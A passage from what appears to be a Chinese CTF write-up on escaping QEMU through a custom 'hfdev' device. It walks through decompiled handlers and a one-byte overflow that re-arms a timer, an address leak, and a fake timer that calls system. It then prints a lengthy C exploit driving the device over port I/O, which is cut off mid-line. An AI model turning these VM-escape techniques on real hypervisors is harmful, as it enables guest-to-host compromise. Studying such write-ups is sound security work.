class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * timer_mod:</span></span><br><span class="line"><span class="comment"> * @ts: the timer</span></span><br><span class="line"><span class="comment"> * @expire_time: the expire time in the units associated with the timer</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Modify a timer to expiry at @expire_time, taking into</span></span><br><span class="line"><span class="comment"> * account the scale associated with the timer.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * This function is thread-safe but the timer and its timer list must not be</span></span><br><span class="line"><span class="comment"> * freed while this function is running.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">timer_mod</span><span class="params">(QEMUTimer *ts, <span class="keyword">int64_t</span> expire_timer)</span></span>;</span><br></pre></td></tr></table></figure><p>可以知道这会触发之前的timer，也就是会接着调用<code>hfdev_func</code>，其中会修改<code>state-&gt;pad3[1832]</code>，所以根据<code>v12</code>的值，只能调用一次，同时可以注意到，<code>hfdev_func</code>中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">v1 = *(_QWORD *)&amp;a1-&gt;pad3[<span class="number">24</span>];</span><br><span class="line">*(_QWORD *)&amp;a1-&gt;pad3[<span class="number">1832</span>] = <span class="number">0LL</span>;</span><br><span class="line"><span class="keyword">if</span> ( v1 &lt;= <span class="number">0x100</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">memcpy</span>(&amp;a1-&gt;pad3[*(_QWORD *)&amp;a1-&gt;pad3[<span class="number">16</span>] + <span class="number">1064</span>], *(<span class="keyword">const</span> <span class="keyword">void</span> **)&amp;a1-&gt;pad3[<span class="number">1840</span>], v1);</span><br><span class="line">  result = *(_QWORD *)&amp;a1-&gt;pad3[<span class="number">24</span>];</span><br><span class="line">  *(_QWORD *)&amp;a1-&gt;pad3[<span class="number">16</span>] += result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>a1&gt;pad3[16]</code>不会被置0，所以如果能够多次触发，就能实现越界读写。注意到</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">0x10</span>:</span><br><span class="line">  v9 = *(_WORD *)&amp;a1-&gt;pad3[<span class="number">43</span>];</span><br><span class="line">  result = *(<span class="keyword">unsigned</span> __int16 *)&amp;a1-&gt;pad3[<span class="number">45</span>];</span><br><span class="line">  <span class="keyword">if</span> ( v9 == <span class="number">8706</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v13 = <span class="number">512</span>;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int16)result &lt;= <span class="number">0x200</span>u )</span><br><span class="line">      v13 = *(<span class="keyword">unsigned</span> __int16 *)&amp;a1-&gt;pad3[<span class="number">45</span>];</span><br><span class="line">    <span class="keyword">if</span> ( (_WORD)result )</span><br><span class="line">    &#123;</span><br><span class="line">      v14 = (<span class="keyword">unsigned</span> __int16)v13;</span><br><span class="line">      v15 = a1-&gt;pad3[<span class="number">41</span>];</span><br><span class="line">      v16 = a1-&gt;pad3[<span class="number">42</span>];</span><br><span class="line">      result = (__int64)&amp;a1-&gt;pad3[<span class="number">47</span>];</span><br><span class="line">      v17 = &amp;a1-&gt;pad3[v13 - <span class="number">1</span> + <span class="number">48</span>];</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        v18 = *(_BYTE *)result++;</span><br><span class="line">        *(_BYTE *)(result + <span class="number">1016</span>) = v16 ^ (v15 + v18);</span><br><span class="line">        *(_QWORD *)&amp;a1-&gt;pad3[<span class="number">16</span>] = v14;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( v17 != (<span class="keyword">char</span> *)result );</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>可以先让<code>a1-&gt;pad3[16]=512</code>，第一次触发timer时，<code>a1-&gt;pad3[16]+=0x100</code>，也就是<code>a1-&gt;pad3[16]=768</code>，而上面1 byte溢出的溢出地址就是由<code>a1-&gt;pad3[16]</code>控制的，这个时候可以溢出到<br><code>a1-&gt;pad3[1832]</code>也就是控制timer是否能够触发的标志位，就能实现多次触发时钟。因为能够多次触发时钟，所以我们可以获得一个很大范围的数据的读取，再看<code>hfdev_process</code>中<code>case 0x20:</code>的部分（这里还原了一些符号）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">0x20</span>:</span><br><span class="line">  v7 = *(<span class="keyword">unsigned</span> __int16 *)&amp;a1-&gt;control.field_9[<span class="number">2</span>];</span><br><span class="line">  copy_cursor = a1-&gt;copy_cursor;</span><br><span class="line">  <span class="keyword">if</span> ( v7 &gt; copy_cursor )</span><br><span class="line">    v7 = (<span class="keyword">unsigned</span> __int16)copy_cursor;</span><br><span class="line">  <span class="keyword">return</span> cpu_physical_memory_rw(*(_QWORD *)&amp;a1-&gt;control.fn1, (__int64)a1-&gt;pad3, v7, <span class="number">1u</span>);</span><br></pre></td></tr></table></figure><p>这里可以让我们把数据读取回一个给定的物理地址，而<code>v7</code>是我们可控的长度</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*(_QWORD *)&amp;a1-&gt;pad3[<span class="number">1840</span>] = (<span class="keyword">char</span> *)v1 + v11;</span><br></pre></td></tr></table></figure><p>对比这个<code>*(_QWORD *)&amp;a1-&gt;pad3[1840]</code>，就是timer callback中的src地址，我们可以泄漏这个地址（v1 + v11，符号化之后即为hfdev_state中控制结构体的起始地址加上第二个参数）。这个地址在堆区，可以先泄漏这个地址，然后计算出timer的地址。虽然在<code>case 0x20:</code>对<code>v11</code>的大小做了检查，但是由于之前增加了<code>cursor</code>导致我们使用<code>hfdev_process</code>和<code>hfdev_func</code>都能够访问更大的范围，所以在触发timer，callback还未执行前，可以重新利用<code>0x2022</code>功能修改掉<code>hfdev_func</code>中的复制目标，正好，在<code>hfdev_port_write</code>的<code>case 0x10:</code>中就有能够修改callback触发延迟的功能。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">10LL</span>:</span><br><span class="line">  a1-&gt;time = qemu_clock_get_ns(<span class="number">1LL</span>) + <span class="number">100000000</span> * a3;</span><br><span class="line">  <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><p>这样我们就可以在触发前利用溢出，将<code>bh-&gt;cb</code>或者<code>timer-&gt;cb</code>复制到<code>timer</code>（这时的cursor指向timer）上，接下来就可以计算pie偏移，程序基址，system plt等等。</p><p>然后根据得到的地址，我们可以伪造一个timer，因为我们之前已经得到了发送的control结构的地址，而这个结构中有一块很大的buffer，足够构造一个fake timer (或者fake bh也可以) 将这个timer的callback设置为<code>system</code>，并且opaque设置为命令的地址，这样该指针就会被rdi寄存器传递，然后触发timer即可（注意fake timer也要有timer_list）完整exp如下。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SHIFT 12</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SIZE (1 &lt;&lt; PAGE_SHIFT) <span class="comment">//4096</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PFN_PRESENT (1ull &lt;&lt; 63)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PFN_PFN ((1ull &lt;&lt; 55) - 1)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PMIO_BASE 0x000000000000c040</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Control</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">char</span> switcher;</span><br><span class="line">    __attribute__((packed)) __attribute__((aligned(<span class="number">1</span>))) <span class="keyword">uint16_t</span> fn1;</span><br><span class="line">    __attribute__((packed)) __attribute__((aligned(<span class="number">1</span>))) <span class="keyword">uint16_t</span> fn2;</span><br><span class="line">    __attribute__((packed)) __attribute__((aligned(<span class="number">1</span>))) <span class="keyword">uint16_t</span> fn3;</span><br><span class="line">    <span class="keyword">char</span> field_9[<span class="number">1017</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> fd;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">page_offset</span><span class="params">(<span class="keyword">uint32_t</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> addr &amp; ((<span class="number">1</span> &lt;&lt; PAGE_SHIFT) - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">gva_to_gfn</span><span class="params">(<span class="keyword">void</span> *addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> pme, gfn;</span><br><span class="line">    <span class="keyword">size_t</span> offset;</span><br><span class="line">    offset = ((<span class="keyword">uintptr_t</span>)addr &gt;&gt; <span class="number">9</span>) &amp; ~<span class="number">7</span>;</span><br><span class="line">    lseek(fd, offset, SEEK_SET);</span><br><span class="line">    read(fd, &amp;pme, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span> (!(pme &amp; PFN_PRESENT))</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    gfn = pme &amp; PFN_PFN;</span><br><span class="line">    <span class="keyword">return</span> gfn;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">gva_to_gpa</span><span class="params">(<span class="keyword">void</span> *addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> gfn = gva_to_gfn(addr);</span><br><span class="line">    assert(gfn != <span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">return</span> (gfn &lt;&lt; PAGE_SHIFT) | page_offset((<span class="keyword">uint64_t</span>)addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">pmio_read</span><span class="params">(<span class="keyword">uint64_t</span> port)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> val;</span><br><span class="line">    val = inw(PMIO_BASE + port);</span><br><span class="line">    <span class="keyword">return</span> val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pmio_write</span><span class="params">(<span class="keyword">uint64_t</span> port, <span class="keyword">uint64_t</span> val)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    outw(val, PMIO_BASE + port);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">trigger_process</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    pmio_write(<span class="number">12</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ret = <span class="number">0</span>;</span><br><span class="line">    fd = open(<span class="string">&quot;/proc/self/pagemap&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;open&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    iopl(<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Control</span> *<span class="title">control</span> =</span> (struct Control *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct Control));</span><br><span class="line">    <span class="keyword">uint32_t</span> control_paddr = gva_to_gpa(control);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] control_paddr: 0x%x\n&quot;</span>, control_paddr);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// set addr</span></span><br><span class="line">    pmio_write(<span class="number">2</span>, control_paddr &amp; <span class="number">0xffff</span>);</span><br><span class="line">    pmio_write(<span class="number">4</span>, (control_paddr &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xffff</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint64_t</span> timer_enabled = pmio_read(<span class="number">6</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] timer_enabled: 0x%llx\n&quot;</span>, timer_enabled);</span><br><span class="line">    <span class="keyword">uint64_t</span> copy_cursor = pmio_read(<span class="number">8</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] copy_cursor: 0x%llx\n&quot;</span>, copy_cursor);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// set copy control len to 0x400</span></span><br><span class="line">    pmio_write(<span class="number">6</span>, <span class="number">0x400</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// now set cursor to 0x200</span></span><br><span class="line">    control-&gt;switcher = <span class="number">0x10</span>;</span><br><span class="line">    control-&gt;fn1 = <span class="number">0</span>;</span><br><span class="line">    control-&gt;fn2 = <span class="number">0x2202</span>;</span><br><span class="line">    control-&gt;fn3 = <span class="number">0x200</span>;</span><br><span class="line">    trigger_process();</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] trigger timer\n&quot;</span>);</span><br><span class="line">    <span class="comment">// now trigger timer, cursor should be 0x300 after timer callback</span></span><br><span class="line">    <span class="built_in">memset</span>(control, <span class="number">0</span>, <span class="keyword">sizeof</span>(*control));</span><br><span class="line">    control-&gt;switcher = <span class="number">0x30</span>;</span><br><span class="line">    control-&gt;fn1 = <span class="number">0x100</span>;</span><br><span class="line">    control-&gt;fn2 = <span class="number">0</span>;</span><br><span class="line">    trigger_process();</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// check timer_enabled</span></span><br><span class="line">    timer_enabled = pmio_read(<span class="number">6</span>);</span><br><span class="line">    assert(timer_enabled == <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] timer_enabled: 0x%llx\n&quot;</span>, timer_enabled);</span><br><span class="line">    copy_cursor = pmio_read(<span class="number">8</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] copy_cursor: 0x%llx\n&quot;</span>, copy_cursor);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">        do</span></span><br><span class="line"><span class="comment">        &#123;</span></span><br><span class="line"><span class="comment">          a1-&gt;pad3[result] ^= *((_BYTE *)&amp;a1-&gt;control.fn3 + result);</span></span><br><span class="line"><span class="comment">          ++result;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">        while ( v10 &gt;= (int)result );    </span></span><br><span class="line"><span class="comment">        // v10 = 0x300 now, and timer_enabled is located at a1-&gt;pad3[0x300]</span></span><br><span class="line"><span class="comment">        // so we set field_9 + 0x300 to 0x1, and trigger hfdev_process (case 0x10)</span></span><br><span class="line"><span class="comment">        // then we can flip the timer_enabled bit and trigger timer callback again.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] flip timer_enabled\n&quot;</span>);</span><br><span class="line">    <span class="built_in">memset</span>(control, <span class="number">0</span>, <span class="keyword">sizeof</span>(*control));</span><br><span class="line">    control-&gt;switcher = <span class="number">0x10</span>;</span><br><span class="line">    control-&gt;fn1 = <span class="number">0</span>;</span><br><span class="line">    control-&gt;fn2 = <span class="number">0x2022</span>;</span><br><span class="line">    control-&gt;fn3 = <span class="number">0x300</span>;</span><br><span class="line">    control-&gt;field_9[<span class="number">0x300</span>] = <span class="number">0x1</span>;</span><br><span class="line">    trigger_process();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] waiting...\n&quot;</span>);</span><br><span class="line">    sleep(<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// check timer_enabled</span></span><br><span class="line">    timer_enabled = pmio_read(<span class="number">6</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] timer_enabled: 0x%llx\n&quot;</span>, timer_enabled);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] enable timer again!\n&quot;</span>);</span><br><span class="line">    copy_cursor = pmio_read(<span class="number">8</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] copy_cursor: 0x%llx\n&quot;</span>, copy_cursor);</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// trigger timer again</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] trigger timer again\n&quot;</span>);</span><br><span class="line">    <span class="built_in">memset</span>(control, <span class="number">0</span>, <span class="keyword">sizeof</span>(*control));</span><br><span class="line">    control-&gt;switcher = <span class="number">0x30</span>;</span><br><span class="line">    control-&gt;fn1 = <span class="number">0x10</span>;</span><br><span class="line">    control-&gt;fn2 = <span class="number">0x0</span>;</span><br><span class="line">    trigger_process();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] waiting...\n&quot;</span>);</span><br><span class="line">        sleep(<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// set copy src to struct Control</span></span><br><span class="line">    <span class="built_in">memset</span>(control, <span class="number">0</span>, <span class="keyword">sizeof</span>(*control));</span><br><span class="line">    control-&gt;switcher = <span class="number">0x30</span>;</span><br><span class="line">    control-&gt;fn1 = <span class="number">0x0</span>;</span><br><span class="line">    control-&gt;fn2 = <span class="number">0x0</span>;</span><br><span class="line">    trigger_process();</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    timer_enabled = pmio_read(<span class="number">6</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] timer_enabled: 0x%llx\n&quot;</span>, timer_enabled);</span><br><span class="line">    copy_cursor = pmio_read(<span class="number">8</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] copy_cursor: 0x%llx\n&quot;</span>, copy_cursor);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// leak timer address</span></span><br><span class="line">    <span class="keyword">char</span> *buf = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    <span class="keyword">uint32_t</span> buf_paddr = gva_to_gpa(buf);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] buf: 0x%llx buf_paddr: 0x%x\n&quot;</span>, buf, buf_paddr);</span><br><span class="line">    <span class="built_in">memset</span>(control, <span class="number">0</span>, <span class="keyword">sizeof</span>(*control));</span><br><span class="line">    control-&gt;switcher = <span class="number">0x20</span>;</span><br><span class="line">    *((<span class="keyword">uint32_t</span> *)&amp;(control-&gt;fn1)) = buf_paddr;</span><br><span class="line">    *(<span class="keyword">uint16_t</span> *)&amp;control-&gt;field_9[<span class="number">2</span>] = <span class="number">0x310</span>;</span><br><span class="line">    trigger_process();</span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// char *buf = (char *)malloc(0x1000);</span></span><br><span class="line">    <span class="comment">// uint32_t buf_paddr = gva_to_gpa(buf);</span></span><br><span class="line">    <span class="keyword">uint64_t</span> control_addr = *(<span class="keyword">uint64_t</span> *)&amp;buf[<span class="number">0x308</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] control_addr: 